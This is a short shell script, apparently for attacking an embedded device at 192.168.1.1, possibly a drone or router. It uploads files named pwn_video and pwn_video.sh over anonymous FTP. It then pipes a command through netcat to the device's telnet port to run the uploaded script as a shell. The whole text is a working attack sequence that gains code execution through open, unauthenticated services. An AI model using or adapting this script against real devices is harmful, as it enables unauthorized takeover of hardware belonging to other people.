#!/bin/sh

echo "put pwn_video pwn_video"|ftp -n 192.168.1.1
echo "put pwn_video.sh pwn_video.sh"|ftp -n 192.168.1.1

echo "/bin/sh /data/video/pwn_video.sh;exit" |nc 192.168.1.1 23 >/dev/null
